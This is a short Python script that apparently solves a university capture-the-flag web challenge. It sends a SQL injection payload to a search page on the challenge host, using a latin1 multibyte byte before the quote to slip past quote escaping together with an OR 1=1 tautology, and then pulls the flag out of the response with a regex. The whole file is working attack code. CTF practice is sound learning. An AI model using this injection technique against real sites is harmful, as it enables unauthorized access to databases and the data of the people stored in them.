import requests
import re

payload = "\xe0' OR 1=1--"
param = payload.encode("latin1")

# Manually build the full query string
from urllib.parse import quote_from_bytes

url = f"https://waynestateuniversity-ctf24-ustreasuryhack.chals.io/search.php?user={quote_from_bytes(param)}"

print("[DEBUG] Sending to:", url)
response = requests.get(url)

print("flag: " + re.findall(r'WSUCTF{.*}', response.text)[0])